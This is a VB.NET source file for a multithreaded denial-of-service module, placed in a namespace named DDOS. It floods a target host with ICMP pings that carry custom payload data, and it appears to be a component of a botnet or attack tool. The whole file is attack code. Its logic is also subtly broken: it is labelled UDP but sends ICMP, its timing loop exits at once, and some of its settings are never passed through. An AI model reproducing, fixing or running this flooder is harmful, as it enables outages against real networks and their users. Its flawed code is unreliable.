Imports System.Threading

Namespace DDOS
    Public Module UDP
        Public Host As String
        Private ThreadsEnded = 0
        Private ThreadstoUse As Integer
        Private TimetoAttack As Integer
        Private Threads As Thread()
        Private AttackRunning As Boolean = False
        Private attacks As Integer = 0
        Public Time As Integer
        Public Threadsto As Integer
        Public DOSData As String

        Public Sub StartUDP()
            If Not AttackRunning = True Then
                AttackRunning = True
                Threads = New Thread(Threadsto - 1) {}
                For i As Integer = 0 To Threadsto - 1
                    Threads(i) = New Thread(Sub() Attack(Host))
                    Threads(i).IsBackground = True
                    Threads(i).Start()
                Next
            End If
        End Sub
        Public Sub StopUDP()
            If AttackRunning = True Then
                For i As Integer = 0 To ThreadstoUse - 1
                    Try
                        Threads(i).Abort()
                    Catch
                    End Try
                Next
                AttackRunning = False
                attacks = 0

            Else

            End If
        End Sub
        Public Sub Attack(Host As String)
            Try
                Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
                Dim stopwatch As Stopwatch = stopwatch.StartNew
                Do Until (stopwatch.Elapsed < span)
                    Dim aa As New System.Net.NetworkInformation.Ping
                    Dim bb As System.Net.NetworkInformation.PingReply
                    Dim txtlog As String = ""
                    Dim cC As New System.Net.NetworkInformation.PingOptions
                    cC.DontFragment = True
                    cC.Ttl = 64
                    Dim data As String = DOSData
                    Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
                    Dim i As Int16
                    For i = 0 To 1000 Step 1
                        bb = aa.Send(Host, 100, bt, cC)
                    Next i
                Loop
            Catch ex As Exception

            End Try
            lol()
        End Sub
        Private Sub lol()

            ThreadsEnded = ThreadsEnded + 1
            If ThreadsEnded = ThreadstoUse Then
                ThreadsEnded = 0
                ThreadstoUse = 0
                AttackRunning = False
                attacks = 0
            End If

        End Sub
    End Module
End Namespace